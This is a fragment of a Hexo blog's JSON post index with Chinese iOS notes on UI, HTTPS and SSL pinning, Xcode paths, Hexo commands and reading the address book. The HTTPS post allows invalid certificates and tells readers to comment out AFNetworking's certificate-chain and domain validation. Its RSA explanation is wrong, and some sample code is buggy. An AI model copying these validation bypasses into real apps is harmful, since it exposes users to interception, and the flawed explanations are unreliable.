UIStatusBarStyleLightContent;&#125; StatusBar隐藏 viewController里重写函数 123- (BOOL)prefersStatusBarHidden &#123; return YES&#125; 部分情况下ScrollView无法插入StatusBar viewController使用了NavigationController,设置了NavigationController为Hidden,整个self.view上是一张大的ScrollView,因为VC对ScrollView的自动调整,无法让ScrollView的顶部对齐屏幕顶部,而是对齐了StatusBar的底部 12[self.navigationController setNavigationBarHidden:YES];[self setAutomaticallyAdjustsScrollViewInsets:NO];","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"StatusBar","slug":"StatusBar","permalink":"http://yoursite.com/tags/StatusBar/"}]},{"title":"判断当前窗口是否显示","date":"2015-11-06T15:00:00.000Z","path":"2015/11/07/判断当前窗口是否显示/","text":"判断当前窗口是否显示假如一个UIView对象当前正在显示，那么它的window属性肯定为非空值。虽然官方文档未说明UIView未显示时window属性的取值，但是经过简单的测试，大部分情况下UIView未显示时，window的值为空，因此依据此判断当前UIViewController是否正在显示。但是访问UIViewController的view属性时，可能会引起view加载(假如此时还未加载)，这是不必要的，而且还可能引起无法预期的问题。因此在访问view属性之前，最好先检查isViewLoaded属性来避免上述问题. 示例代码如下，在UIViewController的扩展中声明了一个isVisible方法，方便以后调用 注意：UIView的官方文档中仅注明当view还未添加到window时，window属性为空；但是并未提及当window为nil时，当前view未显示。通过简单的Demo检测上文的方法可满足大部分需求，因此使用时建议进行简单测试！ 123if(self.view.isViewLoaded &amp;&amp; self.view.window) &#123; &#x2F;&#x2F;code&#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"ViewController","slug":"ViewController","permalink":"http://yoursite.com/tags/ViewController/"},{"name":"UI","slug":"UI","permalink":"http://yoursite.com/tags/UI/"}]},{"title":"HTTPS总结文稿","date":"2015-10-31T15:00:00.000Z","path":"2015/11/01/HTTPS总结/","text":"HTTPS定义 全称：Hypertext Transfer Protocol over Secure Socket Layer HTTP的安全版，即HTTP之下TCP之上加入SSL层，与HTTP不同的是__不同的默认端口(http通常是80，https通常是443)__及一个加密/身份验证层 HTTPS协议需要到CA申请证书，免费证书很少，需要交费 HTTP的连接是无状态的；HTTPS协议包含一种类似握手协议的身份认证过程（认证是单向的/双向的） 有两种基本的加解密算法类型 对称加密：密钥只有一个，加密解密为同一个密码，且加解密速度快，典型的对称加密算法有DES、AES等； 类似传统的账号密码概念，内容是账号密码是密钥 非对称加密：密钥成对出现，且根据公钥无法推知私钥，根据私钥也无法推知公钥；加密解密使用不同密钥，公钥加密需要私钥解密，私钥加密需要公钥解密，如RSA。 密文 S = A×B，S是加密后的内容，A与B分别是两个大素数（仅可被自己与1整除，如13），这样使用A加密后的结果S只能被B除尽（解开），反之同理。 有两种认证方法（单向/双向） 单向认证：一般意义的https，如浏览器访问https网站 主要保证服务器是它自己所声明的正确地址 客户端和服务端的内容都是通过对称密钥加密的 对称密钥是由客户端产生，通过服务器派发出的公钥加密后发送给服务器 双向认证：客户端也具有一个自己的证书，如银行的U盾 客户端本身具备证书，保密的是传输过程本身而不一定能保证服务器本身是安全的 如常见的钓鱼网站或DNS劫持，用户访问的域名并没有指向正确的地址，所以客户端证书本身并无法确保服务器是真实的 双向认证是指客户端不仅要向CA验证服务器本身的真实性，服务器在响应数据时也要验证接收方的真实性 详细链接 Https detail 证书格式以及转化证书的标准PKCS 全称是 Public-Key Cryptography Standards 是由 RSA 实验室与其它安全系统开发商为促进公钥密码的发展而制订的一系列标准 PKCS 目前共发布过 15 个标准。 常见的标准： PKCS#7 Cryptographic Message Syntax Standard PKCS#10 Certification Request Standard PKCS#12 Personal Information Exchange Syntax Standard X.509是常见通用的证书格式。所有的证书都符合为Public Key Infrastructure (PKI) 制定的 ITU-T X509 国际标准。 PKCS#7 常用的后缀是： .P7B .P7C .SPC PKCS#12 常用的后缀有： .P12 .PFX X.509 DER 编码(ASCII)的后缀是： .DER .CER .CRT X.509 PAM 编码(Base64)的后缀是： .PEM .CER .CRT 编码与扩展名X.509证书是一个数字文档，具有扩展名和编码两个属性 .DER = DER是一种编码，扩展名有三种。以二进制存放，常见于Windows系统 .PEM = PEM是一种编码，扩展名也是三种，文件开始由一行”—– BEGIN …“开始。 .CRT = CRT常见于Linux/Unix证书。证书可以是DER编码，也可以是PEM编码。 .CER = CRT证书的微软型式。也可以用两种编码。 .KEY = 扩展名KEY用于PCSK#8的公钥和私钥。可以是两种编码。 扩展名CER和CRT几乎是同义词，CRT文件和CER文件只有在使用相同编码的时候才可以通过改后缀名代替。 证书之间的转换只有编码相同可以通过改后缀名代替，正常情况下应该通过专业的编码工具来互相转换，如OpenSSL 1&quot;openssl x509 -in 你的证书.crt -out 你的证书.cer -outform der&quot; CA签名证书与自签名证书CA签名证书如何验证HTTPS连接建立过程大致是: 客户端和服务端建立一个连接 服务端返回一个证书 客户端里存有各个受信任的证书机构根证书**(IOS8 预装的根证书Apple Support**) 用这些根证书对服务端返回的证书进行验证，经验证如果证书是可信任的，就生成一个pre-master secret 用这个证书的公钥加密后发送给服务端，服务端用私钥解密后得到pre-master secret 再根据某种算法生成master secret 客户端也同样根据这种算法从pre-master secret生成master secret 随后双方的通信都用这个master secret对传输数据进行加密解密。 自签名的证书通过SSL Pinning使用 为什么要用SSL Pinning？ 如果服务端的证书是从受信任的的CA机构颁发的，验证是没问题的，但CA机构颁发证书比较昂贵，小企业或个人用户 可能会选择自己颁发证书，这样就无法通过系统受信任的CA机构列表验证这个证书的真伪了，所以需要SSL Pinning这样的方式去验证。 什么是SSL Pinning？ 可以理解为证书绑定，是指客户端直接保存服务端的证书（存入Xcode工程），建立https连接时直接对比服务端返回的和客户端保存的两个证书是否一样，一样就表明证书是真的，不再去系统的信任证书机构里寻找验证。 这适用于非浏览器应用，因为浏览器跟很多未知服务端打交道，无法把每个服务端的证书都保存到本地，但CS架构的手机APP事先已经知道要进行通信的服务端，可以直接在客户端保存这个服务端的证书用于校验。 为什么直接对比就能保证证书没问题？ 如果中间人从客户端取出证书，再伪装成服务端跟其他客户端通信，它发送给客户端的这个证书不就能通过验证吗？确实可以通过验证，但后续的流程走不下去，因为下一步客户端会用证书里的公钥加密，中间人没有这个证书的私钥就解不出内容，也就截获不到数据，这个证书的私钥只有真正的服务端有，中间人伪造证书主要伪造的是公钥。 如何使用AFNetworking发送HTTPS请求建立自己的安全策略（Security Policy）AFSecurityPolicy分三种验证模式： AFSSLPinningModeNone 这个模式表示不做SSL pinning，只跟浏览器一样在系统的信任机构列表里验证服务端返回的证书。若证书是信任机构签发的就会通过，若是自己服务器生成的证书，这里是不会通过的。 AFSSLPinningModeCertificate 这个模式表示用证书绑定方式验证证书，需要客户端保存有服务端的证书拷贝，这里验证分两步，第一步验证证书的域名/有效期等信息，第二步是对比服务端返回的证书跟客户端返回的是否一致。 这里还没弄明白第一步的验证是怎么进行的，代码上跟去系统信任机构列表里验证一样调用了SecTrustEvaluate，只是这里的列表换成了客户端保存的那些证书列表。若要验证这个，是否应该把服务端证书的颁发机构根证书也放到客户端里？ AFSSLPinningModePublicKey 这个模式同样是用证书绑定方式验证，客户端要有服务端的证书拷贝，只是验证时只验证证书里的公钥，不验证证书的有效期等信息。只要公钥是正确的，就能保证通信不会被窃听，因为中间人没有私钥，无法解开通过公钥加密的数据。 整个AFSecurityPolicy就是实现这这几种验证方式，剩下的就是实现细节了，详见源码。 示例代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455- (void)testClientCertificate &#123;NSString *url &#x3D; @&quot;https:&#x2F;&#x2F;218.244.131.231&#x2F;ManicureShop&#x2F;api&#x2F;order&#x2F;pay&#x2F;%@&quot;;NSDictionary *dic &#x3D; @&#123;@&quot;request&quot; : @&#123; @&quot;orderNo&quot; : @&quot;1409282102222110030643&quot;, @&quot;type&quot; : @(2) &#125; &#125;;NSData *postData &#x3D; [NSJSONSerialization dataWithJSONObject:dic options:NSJSONWritingPrettyPrinted error:nil];&#x2F;&#x2F;stringWithFormat 自定义文字混淆函数NSString *sign &#x3D; [self signWithSignKey:@&quot;test&quot; params:dic];NSMutableData *body &#x3D; [postData mutableCopy];NSLog(@&quot;%@&quot;, [[NSString alloc] initWithData:body encoding:NSUTF8StringEncoding]); url &#x3D; [NSString stringWithFormat:url, sign];&#x2F;&#x2F;设置可以解析的文本&#x2F;&#x2F;code &#x3D;1016错误因为这里AFHTTPRequestOperationManager *manager &#x3D; [AFHTTPRequestOperationManager manager];manager.requestSerializer &#x3D; [AFJSONRequestSerializer serializer];manager.responseSerializer &#x3D; [AFJSONResponseSerializer serializer];[manager.requestSerializer setValue:@&quot;application&#x2F;json&quot; forHTTPHeaderField:@&quot;Accept&quot;];[manager.requestSerializer setValue:@&quot;application&#x2F;json&quot; forHTTPHeaderField:@&quot;Content-Type&quot;];manager.responseSerializer.acceptableContentTypes &#x3D; [NSSet setWithArray:@[@&quot;application&#x2F;json&quot;, @&quot;text&#x2F;plain&quot;,@&quot;text&#x2F;html&quot;]];&#x2F;&#x2F;自定义安全策略manager.securityPolicy &#x3D; [self customSecurityPolicy];[manager POST:url parameters:dic success:^(AFHTTPRequestOperation *operation, id responseObject) &#123;NSLog(@&quot;JSON: %@&quot;, responseObject);&#125; failure:^(AFHTTPRequestOperation *operation, NSError *error) &#123;NSLog(@&quot;Error: %@&quot;, error);&#125;];&#125;&#x2F;&#x2F;某种和服务器约定的混淆方式 默认使用不混淆-(id) signWithSingleKey:(NSString *)inString params: (NSDictionary *)inDictionnary &#123;return inString;&#125;&#x2F;&#x2F;AFNetworking的自定义安全措施-(AFSecurityPolicy *) customSecurityPolicy &#123;NSString *cerPath &#x3D; [[NSBundle mainBundle] pathForResource:@&quot;工程根目录中证书的名字&quot; ofType:@&quot;cer&quot;];NSData *certData &#x3D; [NSData dataWithContentsOfFile:cerPath];&#x2F;&#x2F;初始化时使用证书绑定加密 也可以使用公钥绑定加密 可选有3种模式AFSecurityPolicy *securityPolicy &#x3D; [AFSecurityPolicy policyWithPinningMode:AFSSLPinningModeCertificate];&#x2F;&#x2F;允许使用非CA签名的证书&#x2F;&#x2F;这里有个问题，如果使用的是IP测试模式 不通过DNS 需要去AFNet的安全.m文件里注销掉验证域名的代码 code&#x3D;1012因为这里[securityPolicy setAllowInvalidCertificates:YES];[securityPolicy setPinnedCertificates:@[certData]];return securityPolicy;&#125; 注销域名验证前面说过，验证站点证书，是通过域名的，如果服务器端站点没有绑定域名（万恶的备案），仅靠IP地址上面的方法是绝对不行的。需要修改AFNetworking2的源代码！打开AFSecurityPolicy.m文件，找到方法： 1- (BOOL)evaluateServerTrust:(SecTrustRef)serverTrust forDomain:(NSString *)domain 将下面这部分注释掉 12345678910&#x2F;&#x2F; SecTrustSetAnchorCertificates(serverTrust, (__bridge CFArrayRef)pinnedCertificates);&#x2F;&#x2F;&#x2F;&#x2F; if (!AFServerTrustIsValid(serverTrust)) &#123;&#x2F;&#x2F; return NO;&#x2F;&#x2F; &#125;&#x2F;&#x2F;&#x2F;&#x2F; if (!self.validatesCertificateChain) &#123;&#x2F;&#x2F; return YES;&#x2F;&#x2F; &#125; 这样，AFSecurityPolicy就只会比对服务器证书和内嵌证书是否一致，不会再验证证书是否和站点域名一致了。","tags":[{"name":"Security","slug":"Security","permalink":"http://yoursite.com/tags/Security/"},{"name":"Net","slug":"Net","permalink":"http://yoursite.com/tags/Net/"},{"name":"HTTP","slug":"HTTP","permalink":"http://yoursite.com/tags/HTTP/"}]},{"title":"Xcode相关的各种路径","date":"2015-10-31T15:00:00.000Z","path":"2015/11/01/Xcode路径/","text":"NSBundle 一个NSBundle代表一个文件夹,利用NSBundle能访问对应的文件夹 利用mainBundle就可以访问软件资源包中的任何资源 模拟器应用程序的安装路径1&#x2F;Users&#x2F;aplle&#x2F;资源库&#x2F;Application Support&#x2F;iPhone Simulator&#x2F;7.1&#x2F;Applications Xcode文档安装路径1&#x2F;Applications&#x2F;Xcode.app&#x2F;Contents&#x2F;Developer&#x2F;Documentation&#x2F;DocSets Xcode模拟器安装路径1&#x2F;Applications&#x2F;Xcode.app&#x2F;Contents&#x2F;Developer&#x2F;Platforms&#x2F;iPhoneSimulator.platform&#x2F;Developer&#x2F;SDKs Xcode自带头文件的路径1&#x2F;Applications&#x2F;Xcode.app&#x2F;Contents&#x2F;Developer&#x2F;Platforms&#x2F;iPhoneSimulator.platform&#x2F;Developer&#x2F;SDKs&#x2F;iPhoneSimulator7.1.sdk&#x2F;System&#x2F;Library&#x2F;Frameworks&#x2F;UIKit.framework&#x2F;Headers 修改了系统自带头文件后,Xcode会报错解决方案:删掉下面文件夹的缓存即可(aplle是电脑的用户名) 1&#x2F;Users&#x2F;aplle&#x2F;资源库&#x2F;Developer&#x2F;Xcode&#x2F;DerivedData 或者 1&#x2F;Users&#x2F;aplle&#x2F;Library&#x2F;Developer&#x2F;Xcode&#x2F;DerivedData Xcode插件的安装路径可以在这里删除内容来卸载插件 12345aplle是用户名&#x2F;Users&#x2F;aplle&#x2F;Library&#x2F;Application Support&#x2F;Developer&#x2F;Shared&#x2F;Xcode&#x2F;Plug-ins&#96;&#96;&#96;## 沙盒路径 /Users/apple/Library/Application Support/iPhone Simulator/ 7.1/Applications/ 246D511D-E377-492F-8D02-B7AB3589758E/Documents 123## Codesnippets代码段储存位置 ~/Library/Developer/Xcode/UserData/CodeSnippets 123## 合并手机和模拟器静态库 lipo -create Debug-iphoneos/libBestpayLogin.a Debug-iphonesimulator/libBestpayLogin.a -output libBestpayLogin.a","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"}]},{"title":"Hexo常用指令","date":"2015-10-28T15:00:00.000Z","path":"2015/10/29/hexo常用指令/","text":"bashnpm install hexo -g #安装 npm update hexo -g #升级 hexo init #初始化 简写 hexo n \"我的博客\" == hexo new \"我的博客\" #新建文章hexo p == hexo publishhexo g == hexo generate#生成hexo s == hexo server #启动服务预览hexo d == hexo deploy#部署 服务器 hexo server #Hexo 会监视文件变动并自动更新，您无须重启服务器。hexo server -s #静态模式hexo server -p 5000 #更改端口hexo server -i 192.168.1.1 #自定义 IP hexo clean #清除缓存 网页正常情况下可以忽略此条命令hexo g #生成静态网页hexo d #开始部署 监视文件变动 hexo generate #使用 Hexo 生成静态文件快速而且简单hexo generate --watch #监视文件变动 完成后部署 两个命令的作用是相同的hexo generate --deployhexo deploy --generate hexo deploy -ghexo server -g 草稿 hexo publish [layout] &lt;title&gt; 模版 hexo new \"postName\" #新建文章hexo new page \"pageName\" #新建页面hexo generate #生成静态页面至public目录hexo server #开启预览访问端口（默认端口4000，'ctrl + c'关闭server）hexo deploy #将.deploy目录部署到GitHub hexo new [layout] &lt;title&gt;hexo new photo \"My Gallery\"hexo new \"Hello World\" --lang tw 变量 描述 layout 布局 title 标题 date 文件建立日期 title: 使用Hexo搭建个人博客 layout: post date: 2014-03-03 19:07:43 comments: true categories: Blog tags: [Hexo] keywords: Hexo, Blog description: 生命在于折腾，又把博客折腾到Hexo了。给Hexo点赞。 模版（Scaffold） hexo new photo \"My Gallery\" 变量 描述 layout 布局 title 标题 date 文件建立日期 设置文章摘要 以上是文章摘要 &lt;!--more--&gt; 以下是余下全文 写作 hexo new page &lt;title&gt;hexo new post &lt;title&gt; 变量 描述 :title 标题 :year 建立的年份（4 位数） :month 建立的月份（2 位数） :i_month 建立的月份（去掉开头的零） :day 建立的日期（2 位数） :i_day 建立的日期（去掉开头的零） 推送到服务器上 hexo n #写文章hexo g #生成hexo d #部署 #可与hexo g合并为 hexo d -g 报错 1.找不到git部署 ERROR Deployer not found: git 解决方法 npm install hexo-deployer-git --save 3.部署类型设置git hexo 3.0 部署类型不再是github，_config.yml 中修改 bash# Deployment ## Docs: http://hexo.io/docs/deployment.html deploy: type: git repository: git@***.github.com:***/***.github.io.git branch: master 4. xcodebuild xcode-select: error: tool 'xcodebuild' requires Xcode, but active developer directory '/Library/Developer/CommandLineTools' is a command line tools instance npm install bcrypt 5. RSS不显示 安装RSS插件 npm install hexo-generator-feed --save 开启RSS功能 编辑hexo/_config.yml，添加如下代码： rss: /atom.xml #rss地址 默认即可 开启评论 1.我使用多说代替自带的评论，在多说 网站注册 &gt; 后台管理 &gt; 添加新站点 &gt; 工具 === 复制通用代码 里面有 short_name 在根目录 _config.yml 添加一行 disqus_shortname: jslite 是在多说注册时产生的 复制到 themes\\landscape\\layout\\_partial\\article.ejs 把 &lt;% if (!index &amp;&amp; post.comments &amp;&amp; config.disqus_shortname)&#123; %&gt; &lt;section id=\"comments\"&gt; &lt;div id=\"disqus_thread\"&gt; &lt;noscript&gt;Please enable JavaScript to view the &lt;lt;a href=\"//disqus.com/?ref_noscript\"&gt;comments powered by Disqus.&lt;/a&gt;&lt;/noscript&gt; &lt;/div&gt; &lt;/section&gt; &lt;% &#125; %&gt; 改为 html&lt;% if (!index &amp;&amp; post.comments &amp;&amp; config.disqus_shortname)&#123; %&gt; &lt;section id=\"comments\"&gt; &lt;!-- 多说评论框 start --&gt; &lt;div class=\"ds-thread\" data-thread-key=\"&lt;%= post.layout %&gt;-&lt;%= post.slug %&gt;\" data-title=\"&lt;%= post.title %&gt;\" data-url=\"&lt;%= page.permalink %&gt;\"&gt;&lt;/div&gt; &lt;!-- 多说评论框 end --&gt; &lt;!-- 多说公共JS代码 start (一个网页只需插入一次) --&gt; &lt;script type=\"text/javascript\"&gt; var duoshuoQuery = &#123;short_name:'&lt;%= config.disqus_shortname %&gt;'&#125;; (function() &#123; var ds = document.createElement('script'); ds.type = 'text/javascript';ds.async = true; ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js'; ds.charset = 'UTF-8'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ds); &#125;)(); &lt;/script&gt; &lt;!-- 多说公共JS代码 end --&gt; &lt;/section&gt; &lt;% &#125; %&gt;","tags":[{"name":"Hexo","slug":"Hexo","permalink":"http://yoursite.com/tags/Hexo/"},{"name":"Terminal","slug":"Terminal","permalink":"http://yoursite.com/tags/Terminal/"}]},{"title":"设置Button的标题","date":"2015-10-26T15:00:00.000Z","path":"2015/10/27/设置Button的标题/","text":"设置Button的标题在定义UIButton的时候，经常会使用titleLabel.text设置UIButton的值，但是Run出来没有任何显示,原因在于: 正常使用UIButton的时候设置Title是要对应Button的ControlState，因为UIButton继承于UIControl，在设置值得时候需要对象状态 setAttributedTitle可以正确设置title,是设置UIButton里的Attribute,而不是组成UIButton里的titlelabel的text[uibutton setAttributedTitle:[[NSAttributedString alloc]initWithString:@\"titleText\"] forState:UIControlStateNormal] 对应的currentTitle 也就是/normal/highlighted/selected/disabled状态下的title值，属性为readOnly 至于通过titleLabel的text不显示的原因是默认UIButton的titleLable是没设置frame的，而且hidden=YES；只要你设置这2个值就可以正常显示UIButton *uibtn = [[UIButton alloc]initWithFrame:CGRectMake(0, 100, 100, 30)];或者UIButton *uibtn = [UIButton buttonWithType:UIButtonTypeCustom];[uibtn setFrame:CGRectMake(0, 100, 100, 30)]; 12- (void)setTitle:(NSString *)title forState:(UIControlState)state;- (void)setAttributedTitle:(NSAttributedString *)title forState:(UIControlState)state","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Button","slug":"Button","permalink":"http://yoursite.com/tags/Button/"}]},{"title":"通讯录读取","date":"2015-10-26T15:00:00.000Z","path":"2015/10/27/通讯录读取/","text":"通讯录读取ContactTool.h#import &lt;Foundation/Foundation.h&gt; #import &lt;UIKit/UIKit.h&gt; typedef void(^AddressBook)(BOOL successed, NSArray&lt;__kindof NSDictionary*&gt; *addressBookArray); UIKIT_EXTERN NSString *const Contact_Name; UIKIT_EXTERN NSString *const Contact_Phone; UIKIT_EXTERN NSString *const Contact_Lowercase_Name; @interface ContactTool : NSObject //读取通讯录，保存为姓名，电话，姓名拼音小写字典 + (void)pickAddressBookCompletion:(AddressBook)completion; //标准化为大陆号码，去除+86和&quot;-&quot;还有&quot; &quot; + (NSString *)phoneNumberFormat:(NSString *)phone; //转换汉字成拼音 + (NSString *)transformToPinyin:(NSString *)string; @end ###ContactTool.m NSString *const Contact_Name = @&quot;name&quot;; NSString *const Contact_Phone = @&quot;phone&quot;; NSString *const Contact_Lowercase_Name = @&quot;lowercaseName&quot;; @implementation ContactTool #pragma mark - AdressBook DataList读取通讯录 + (void)pickAddressBookCompletion:(AddressBook)completion &#123; //创建一个电话本的参考 ABAddressBookRef addressBookRef = ABAddressBookCreateWithOptions(NULL, NULL); //创建一个信号 dispatch_semaphore_t sema = dispatch_semaphore_create(0); //申请接入闭包 ABAddressBookRequestAccessWithCompletion(addressBookRef, ^(bool granted, CFErrorRef error) &#123; //接入成功发送信号 dispatch_semaphore_signal(sema); &#125;); //信号开始是0 发送出一个信号变成-1 信号值小于0时继续执行,如果没有得到信号,等待FOREVER dispatch_semaphore_wait(sema, DISPATCH_TIME_FOREVER); //检查权限 if (ABAddressBookGetAuthorizationStatus() != kABAuthorizationStatusAuthorized) &#123; completion(NO,nil); return; &#125; //检查是否成功创建 if (addressBookRef == nil) &#123; return; &#125; //成功则拷贝电话本 [self copyAddressBook:addressBookRef completion:completion]; &#125; + (void)copyAddressBook:(ABAddressBookRef)addressBook completion:(AddressBook)completion &#123; dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^&#123; //C Float Index 使用有符号long的数目作为索引 获得总人数 CFIndex numberOfPeople = ABAddressBookGetPersonCount(addressBook); // CFArrayRef people = ABAddressBookCopyArrayOfAllPeople(addressBook); // NSMutableArray *addressBookArray = [NSMutableArray array]; for (int i = 0; i &lt; numberOfPeople; ++i) &#123; ABRecordRef person = CFArrayGetValueAtIndex(people, i); NSString *firstName = (__bridge NSString *)(ABRecordCopyValue(person, kABPersonFirstNameProperty)); NSString *lastName = (__bridge NSString *)(ABRecordCopyValue(person, kABPersonLastNameProperty)); NSMutableString *compositeName = nil; //判断是否存在空 if (firstName == nil &amp;&amp; lastName == nil) &#123; compositeName = [NSMutableString stringWithString:@&quot;#&quot;]; &#125;else if (firstName == nil)&#123; compositeName = [NSMutableString stringWithFormat:@&quot;%@&quot;,lastName]; &#125;else if (lastName == nil)&#123; compositeName = [NSMutableString stringWithFormat:@&quot;%@&quot;,firstName]; &#125;else &#123; compositeName = [NSMutableString stringWithFormat:@&quot;%@%@&quot;,lastName,firstName]; &#125; //取出电话号码 ABMultiValueRef phone = ABRecordCopyValue(person, kABPersonPhoneProperty); NSInteger phoneCount = ABMultiValueGetCount(phone); // for (int i = 0; i &lt; phoneCount; ++i) &#123; NSString *phoneNumber = (__bridge NSString *)(ABMultiValueCopyValueAtIndex(phone, i)); phoneNumber = [self phoneNumberFormat:phoneNumber]; //模拟器测试需要注销掉if //RegxTool是个自己写的正则校验函数 if ([RegxTool validPhoneNumber:phoneNumber]) &#123; NSString *lowercaseName = [[self transformToPinyin:compositeName] lowercaseString]; NSDictionary *dict = @&#123;Contact_Name:compositeName,Contact_Phone:phoneNumber,Contact_Lowercase_Name:lowercaseName&#125;; [addressBookArray addObject:dict]; &#125; &#125; &#125; // if (addressBookArray.count &gt; 0) &#123; //字典数组按KEY排序 NSArray *sortedArray = [self sortArray:addressBookArray withKey:(NSString *)Contact_Lowercase_Name]; [addressBookArray removeAllObjects]; [addressBookArray addObjectsFromArray:sortedArray]; //返回结果 dispatch_async(dispatch_get_main_queue(), ^&#123; completion(YES, addressBookArray); &#125;); &#125; &#125;); &#125; + (NSString *)phoneNumberFormat:(NSString *)phone &#123; NSMutableString *tempPhone = [NSMutableString stringWithString:phone]; NSRange prefixRange = [tempPhone rangeOfString:@&quot;+86&quot;]; if (prefixRange.location != NSNotFound) &#123; [tempPhone deleteCharactersInRange:prefixRange]; &#125; NSRange spaceRange = [tempPhone rangeOfString:@&quot; &quot;]; while (spaceRange.location != NSNotFound) &#123; [tempPhone deleteCharactersInRange:spaceRange]; spaceRange = [tempPhone rangeOfString:@&quot; &quot;]; &#125; NSRange linkRange = [tempPhone rangeOfString:@&quot;-&quot;]; while (linkRange.location != NSNotFound) &#123; [tempPhone deleteCharactersInRange:linkRange]; linkRange = [tempPhone rangeOfString:@&quot; &quot;]; &#125; return tempPhone; &#125; + (NSString *)transformToPinyin:(NSString *)string &#123; NSString *regularString = @&quot;^[A-Za-z0-9\\\\p&#123;Z&#125;\\\\p&#123;P&#125;]+$&quot;; NSPredicate *predicate = [NSPredicate predicateWithFormat:@&quot;SELF MATCHES %@&quot;, regularString]; BOOL needTransform = ![predicate evaluateWithObject:string]; // NSMutableString *mutableString = [NSMutableString stringWithString:string]; if (needTransform) &#123; CFStringTransform((CFMutableStringRef)mutableString, NULL, kCFStringTransformToLatin, false); CFStringTransform((CFMutableStringRef)mutableString, NULL, kCFStringTransformStripCombiningMarks, false); &#125; return mutableString; &#125; + (NSArray *)sortArray:(NSArray *)array withKey:(NSString *)key &#123; NSSortDescriptor *sortDesc = [NSSortDescriptor sortDescriptorWithKey:key ascending:YES]; NSArray *sortDescArr = [NSArray arrayWithObject:sortDesc]; NSArray *sortedArr = [array sortedArrayUsingDescriptors:sortDescArr]; return sortedArr; &#125; @end 权限检查代码由于在读取通讯录的过程中,并不一定有读取的权限,如果使用以下代码,在真机调试中可以顺利在获得权限后读取,模拟器中不行,原因: 由于闭包还未返回,代码已经顺序执行,addressBook在顺序执行的过程中始终为nil - (void)pickAddressBook&#123; //读取通讯录权限 if (ABAddressBookGetAuthorizationStatus() == kABAuthorizationStatusNotDetermined) &#123; //请求完成闭包 ABAddressBookRequestAccessWithCompletion(addressBookRef, ^(bool granted, CFErrorRef error) &#123; CFErrorRef *error = NULL; ABAddressBookRef addressBook = ABAddressBookCreateWithOptions(NULL, error); //自定义的拷贝函数 [self copyAddressBook:addressBook]; &#125;); &#125;else if (ABAddressBookGetAuthorizationStatus() == kABAuthorizationStatusAuthorized)&#123; CFErrorRef *error = NULL; ABAddressBookRef addressBook = ABAddressBookCreateWithOptions(NULL, error); //自定义的拷贝函数 [self copyAddressBook:addressBook]; &#125;else&#123; //读取失败提示 dispatch_async(dispatch_get_main_queue(), ^&#123; UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@&quot;翼支付&quot; message:@&quot;通讯录读取&quot; cancelButtonTitle:@&quot;确定&quot; otherButtonTitles:nil, nil]; [alert show]; &#125;); &#125; &#125; 通讯录校验代码电话号码去+86和-+ (NSString *)phoneNumberFormat:(NSString *)phone; 电话号码正则校验+ (BOOL)validPhoneNumber:(NSString *)phone&#123; NSString *regx = @&quot;^[0-9]&#123;11&#125;$&quot;; NSPredicate *pred = [NSPredicate predicateWithFormat:@&quot;SELF MATCHES %@&quot;, regx]; return [pred evaluateWithObject:phone]; return NO; &#125; [正则表达式常用校验][^1] [^1]:","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Contact","slug":"Contact","permalink":"http://yoursite.com/tags/Contact/"}]},{"title":"Hello World","date":"2015-09-30T15:00:00.000Z","path":"2015/10/01/hello-world/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","tags":[]}]